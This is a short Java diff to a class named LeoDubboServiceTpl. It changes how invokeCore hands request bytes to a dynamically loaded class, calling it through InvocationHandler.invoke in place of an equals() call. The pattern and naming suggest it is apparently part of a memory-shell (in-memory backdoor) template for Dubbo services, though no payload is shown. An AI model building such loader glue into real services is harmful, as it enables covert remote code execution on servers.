@@ -21,7 +21,11 @@ public class LeoDubboServiceTpl {
     private byte[] invokeCore(byte[] requestBytes) throws Exception {
         ByteArrayOutputStream exchange = new ByteArrayOutputStream();
         if (requestBytes != null) exchange.write(requestBytes);
-        loadCore().newInstance().equals(exchange);
+        try {
+            ((java.lang.reflect.InvocationHandler) loadCore().newInstance()).invoke(null, null, new Object[]{exchange});
+        } catch (Throwable e) {
+            throw new IllegalStateException("Core invocation failed", e);
+        }
         return exchange.toByteArray();
     }
 
